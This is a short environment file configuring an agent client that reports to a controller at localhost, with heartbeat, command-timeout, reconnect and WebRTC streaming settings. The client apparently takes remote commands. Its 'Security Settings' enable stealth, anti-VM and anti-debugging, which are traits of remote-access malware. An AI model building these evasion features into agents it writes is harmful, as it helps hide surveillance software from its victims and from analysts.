# Client.py Environment Configuration
# This file configures the agent client to connect to the local controller

# Server Connection
FIXED_SERVER_URL=http://localhost:8080
CONTROLLER_URL=http://localhost:8080

# Client Configuration
SILENT_MODE=False
DEBUG_MODE=True
RUN_MODE=agent

# SSL Configuration (set to False for local development)
USE_SSL=False

# Email Notifications (optional)
ENABLE_EMAIL_NOTIFICATIONS=0
GMAIL_USERNAME=
GMAIL_APP_PASSWORD=
EMAIL_RECIPIENT=

# Agent Identity (will be auto-generated if not set)
AGENT_ID=
AGENT_NAME=

# Performance Settings
HEARTBEAT_INTERVAL=30
COMMAND_TIMEOUT=30
MAX_RECONNECT_ATTEMPTS=5

# WebRTC Settings
WEBRTC_ENABLED=true
STREAM_QUALITY=high

# Security Settings
ENABLE_STEALTH=true
ENABLE_ANTI_VM=true
ENABLE_ANTI_DEBUG=true